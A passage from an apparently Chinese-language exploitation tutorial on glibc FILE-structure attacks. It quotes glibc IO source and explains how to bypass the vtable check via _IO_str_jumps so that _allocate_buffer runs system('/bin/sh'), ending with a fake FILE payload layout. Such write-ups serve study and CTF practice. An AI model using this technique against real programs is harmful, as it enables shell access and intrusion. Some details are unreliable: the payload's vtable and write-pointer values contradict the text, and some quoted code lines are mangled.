          fp->_IO_file_flags = 0;
          free(fp);
        }
      return status;
    }
###  第一步先覆盖vtable
    static inline const struct _IO_jump_t *
    IO_validate_vtable (const struct _IO_jump_t *vtable)
    {
      /* Fast path: The vtable pointer is within the __libc_IO_vtables
         section.  */
      uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;//检测
      const char *ptr = (const char *) vtable;
      uintptr_t offset = ptr - __start___libc_IO_vtables;
      if (__glibc_unlikely (offset >= section_length))
        /* The vtable pointer is not in the expected section.  Use the
           slow path, which will terminate the process if necessary.  */
        _IO_vtable_check ();
      return vtable;
    }
在每次调用的时候，会有一次检测，检测是否在`__libc_IO_vtables`内，这个范围很大，里面有很多种IO_x_jumps_x，这次选的是_IO_str_jumps
原本的vtable是指向 `__GI__IO_file_jumps`头，然后调用finish的时候是按照偏移来计算，如果这时候把vtable修改成
`_IO_str_jumps+8`那调用finish就会调用`overflow`
那vtable的修改就完成了，现在来看看`_IO_str_overflow`
    int
    _IO_str_overflow (_IO_FILE *fp, int c)
    {
      int flush_only = c == EOF;
      _IO_size_t pos;
      if (fp->_flags & _IO_NO_WRITES)
          return flush_only ? 0 : EOF;
      if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
        {
          fp->_flags |= _IO_CURRENTLY_PUTTING;
          fp->_IO_write_ptr = fp->_IO_read_ptr;
          fp->_IO_read_ptr = fp->_IO_read_end;
        }
      pos = fp->_IO_write_ptr - fp->_IO_write_base;
      if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
        {
          if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
        return EOF;
          else
        {
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          _IO_size_t new_size = 2 * old_blen + 100;
          if (new_size _s._allocate_buffer) (new_size);//目的
          if (new_buf == NULL)
            {
              /*      __ferror(fp) = 1; */
              return EOF;
            }
          if (old_buf)
            {
              memcpy (new_buf, old_buf, old_blen);
              (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
              /* Make sure _IO_setb won't try to delete _IO_buf_base. */
              fp->_IO_buf_base = NULL;
            }
          memset (new_buf + old_blen, '', new_size - old_blen);
          _IO_setb (fp, new_buf, new_buf + new_size, 1);
          fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
          fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
          fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
          fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
          fp->_IO_write_base = new_buf;
          fp->_IO_write_end = fp->_IO_buf_end;
        }
        }
      if (!flush_only)
        *fp->_IO_write_ptr++ = (unsigned char) c;
      if (fp->_IO_write_ptr > fp->_IO_read_end)
        fp->_IO_read_end = fp->_IO_write_ptr;
      return c;
    }
    libc_hidden_def (_IO_str_overflow)
现在就开始考虑能够执行 `(char *) (*((_IO_strfile *) fp)->_s._allocate_buffer)
(new_size);`的约束条件了
    1、fp->_flags & _IO_NO_WRITES   false
    2、((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING)) false
    3、
    pos = fp->_IO_write_ptr - fp->_IO_write_base;
    #define  _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
    pos >= (_IO_size_t) (_IO_blen (fp) + flush_only false
    _IO_MAGIC 0xFBAD0000
    _IO_NO_WRITES  8
    _IO_TIED_PUT_GET 0x400
    _IO_CURRENTLY_PUTTING 0x800
满足上面三个条件就能进入下面
    flags:直接暴力 为 0；就好
    fp->_IO_write_ptr - fp->_IO_write_base  >=  (fp)->_IO_buf_end - (fp)->_IO_buf_base
    这个自己构造下就好  
    _IO_buf_base
    _IO_buf_end
    _IO_write_base
    _IO_write_ptr
但如果用`(char *) (*((_IO_strfile *) fp)->_s._allocate_buffer)
(new_size)`来执行system(“/bin/sh”);
那new_size = “/bin/sh”的地址,那来看看 new_size是如何计算的，还有allocate_buff的位置
          char *new_buf;
          char *old_buf = fp->_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          _IO_size_t new_size = 2 * old_blen + 100;
          if (new_size _s._allocate_buffer) (new_size);
从上面能看出来`new_size` = 2*(fp)->_IO_buf_end – (fp)->_IO_buf_base +100
那 (fp)->_IO_buf_end – (fp)->_IO_buf_base = (new_size – 100 )/2
IO_buf_base 设置为零，这样会好算点。
：(bin_sh_addr – 100) /2 就是 _IO_buf_end
现在就缺 `_allocate_buffer`的偏移了，要计算这个就要涉及到结构体之间的转换，但偏移是一样的
    最初传进来的 fp是
    _IO_str_overflow (_IO_FILE *fp, int c)
    然后在这里会转换成(char *) (*((_IO_strfile *) fp)
    那就是 _IO_FILE 和 _IO_strfile的转换
_IO_FILE
    struct _IO_FILE {
      int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
      char* _IO_read_ptr;    /* Current read pointer */
      char* _IO_read_end;    /* End of get area. */
      char* _IO_read_base;    /* Start of putback+get area. */
      char* _IO_write_base;    /* Start of put area. */
      char* _IO_write_ptr;    /* Current put pointer. */
      char* _IO_write_end;    /* End of put area. */
      char* _IO_buf_base;    /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
      struct _IO_marker *_markers;
      struct _IO_FILE *_chain;
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
      /*  char* _save_gptr;  char* _save_egptr; */
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };
_IO_strfile
    typedef struct _IO_strfile_
    {
      struct _IO_streambuf _sbf;
      struct _IO_str_fields _s;
    } _IO_strfile;
    struct _IO_streambuf //看道这个就想起了 _IO_FILE_plus
    {
      struct _IO_FILE _f;
      const struct _IO_jump_t *vtable;
    };
    struct _IO_str_fields
    {
      _IO_alloc_type _allocate_buffer;
      _IO_free_type _free_buffer;
    };
那 _IO_FILE_plus的vtable就在0xd8，然后0xe0下面就是 _allocate_buffer
lock要指向一个内存值为0的地方
payload：
    rdi = bin/sh的地址
    _flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = (rdi-100)/2,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = (rdi-100)/2,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = [memery]=>0
    vtable  = _IO_str_overflow +8
    rip =>system
参考：
[FILE_Exploit](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)